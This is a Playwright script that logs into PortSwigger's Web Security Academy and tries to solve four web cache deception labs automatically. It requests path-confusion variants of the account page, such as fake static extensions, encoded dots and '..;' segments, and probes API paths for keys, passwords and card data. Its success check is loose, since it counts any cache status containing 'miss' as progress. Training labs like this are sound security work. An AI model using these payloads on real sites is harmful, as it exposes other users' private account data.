const { chromium } = require('playwright');

const EMAIL = process.env.PORTSWIGGER_EMAIL;
const PASSWORD = process.env.PORTSWIGGER_PASSWORD;

if (!EMAIL || !PASSWORD) {
  console.error("Set PORTSWIGGER_EMAIL and PORTSWIGGER_PASSWORD env vars");
  process.exit(1);
}

const LABS = [
  { num: 1, title: 'Web cache deception' },
  { num: 2, title: 'Web cache deception with authentication' },
  { num: 3, title: 'Web cache deception with dynamic content' },
  { num: 4, title: 'Web cache deception with cachebuster' },
];

async function solveLab(browser, labNum, labTitle) {
  const ctx = await browser.newContext({ viewport: { width: 1280, height: 900 } });
  const page = await ctx.newPage();
  
  try {
    console.log(`\n[web-cache-deception#${labNum}] ${labTitle}`);
    
    // Login
    await page.goto('https://portswigger.net/users', { waitUntil: 'networkidle', timeout: 30000 });
    await page.fill('#EmailAddress', EMAIL);
    await page.fill('#Password', PASSWORD);
    await Promise.all([
      page.waitForNavigation({ timeout: 15000 }).catch(() => {}),
      page.click('#Login'),
    ]);
    await page.waitForTimeout(2000);
    
    // Find lab
    await page.goto('https://portswigger.net/web-security/all-labs', { waitUntil: 'networkidle', timeout: 30000 });
    await page.waitForTimeout(3000);
    
    const labLink = await page.evaluate(({ num }) => {
      const links = [...document.querySelectorAll('.widgetcontainer-lab-link')];
      const topicLinks = links.filter(el => {
        const a = el.querySelector('a');
        return a?.getAttribute('href')?.includes(`/web-security/web-cache-deception/`);
      });
      const target = topicLinks[num - 1];
      if (target?.className.includes('is-solved')) return 'SOLVED';
      return target?.querySelector('a')?.getAttribute('href') || null;
    }, { num: labNum });
    
    if (labLink === 'SOLVED') {
      console.log('  Already solved');
      await ctx.close();
      return true;
    }
    if (!labLink) {
      console.log('  Lab not found');
      await ctx.close();
      return false;
    }
    
    // Launch lab
    await page.goto('https://portswigger.net' + labLink, { waitUntil: 'networkidle', timeout: 30000 });
    const launchLink = await page.$('a[href*="labs/launch"]');
    if (!launchLink) { console.log('  No launch link'); await ctx.close(); return false; }
    
    await page.goto('https://portswigger.net' + (await launchLink.getAttribute('href')), {
      waitUntil: 'domcontentloaded', timeout: 60000,
    });
    await page.waitForTimeout(45000);
    
    const labUrl = page.url();
    if (!labUrl.includes('web-security-academy.net')) {
      console.log('  Lab did not load');
      await ctx.close();
      return false;
    }
    
    const base = new URL(labUrl).origin;
    console.log(`  Lab URL: ${base}`);
    
    // Login to the lab app
    await page.goto(`${base}/login`, { waitUntil: 'networkidle', timeout: 30000 });
    await page.fill('input[name="username"]', 'wiener');
    await page.fill('input[name="password"]', 'peter');
    await Promise.all([
      page.waitForNavigation({ timeout: 15000 }).catch(() => {}),
      page.click('button[type="submit"]'),
    ]);
    await page.waitForTimeout(2000);
    
    // Try cache deception patterns
    const deceptionPaths = [
      '/my-account.css',
      '/my-account.js',
      '/my-account.png',
      '/my-account.gif',
      '/my-account.jpg',
      '/my-account.html.css',
      '/my-account?test.css',
      '/my-account/..;/test.css',
      '/my-account%2e%63%73%73',
      '/my-account/fo.css',
    ];
    
    for (const path of deceptionPaths) {
      console.log(`  Trying: ${path}`);
      
      // First visit to poison cache
      const response = await page.goto(`${base}${path}`, { waitUntil: 'networkidle', timeout: 15000 });
      
      if (response) {
        const headers = await response.allHeaders();
        const cacheHit = headers['x-cache'] || headers['cf-cache-status'] || '';
        console.log(`    Cache status: ${cacheHit}`);
        
        if (cacheHit.toLowerCase().includes('hit') || cacheHit.toLowerCase().includes('miss')) {
          // Wait a bit and check if the lab is solved
          await page.waitForTimeout(5000);
          await page.goto(base, { waitUntil: 'domcontentloaded', timeout: 15000 });
          const body = await page.textContent('body').catch(() => '');
          if (body.toLowerCase().includes('congratulations')) {
            console.log('  SOLVED!');
            await ctx.close();
            return true;
          }
        }
      }
    }
    
    // Try accessing API endpoints with static extensions
    const apiPaths = [
      '/api/user/css',
      '/api/users.css',
      '/api/account.css',
      '/api/keys.css',
    ];
    
    for (const path of apiPaths) {
      console.log(`  Trying API: ${path}`);
      const response = await page.goto(`${base}${path}`, { waitUntil: 'networkidle', timeout: 15000 });
      
      if (response) {
        const body = await response.text();
        if (body.includes('api_key') || body.includes('password') || body.includes('credit')) {
          console.log('    Found sensitive data!');
          await page.waitForTimeout(5000);
          await page.goto(base, { waitUntil: 'domcontentloaded', timeout: 15000 });
          const pageBody = await page.textContent('body').catch(() => '');
          if (pageBody.toLowerCase().includes('congratulations')) {
            console.log('  SOLVED!');
            await ctx.close();
            return true;
          }
        }
      }
    }
    
    console.log('  Not solved');
    await ctx.close();
    return false;
  } catch (e) {
    console.log(`  Error: ${e.message}`);
    await ctx.close();
    return false;
  }
}

async function main() {
  console.log('\nWeb Cache Deception Solver\n');
  const browser = await chromium.launch({ headless: true, args: ['--no-sandbox'] });
  
  let solved = 0, failed = 0;
  for (const lab of LABS) {
    const result = await solveLab(browser, lab.num, lab.title);
    if (result) solved++;
    else failed++;
    await new Promise(r => setTimeout(r, 5000));
  }
  
  console.log(`\nResult: ${solved} solved, ${failed} failed`);
  await browser.close();
}

main().catch(e => { console.error(e); process.exit(1); });
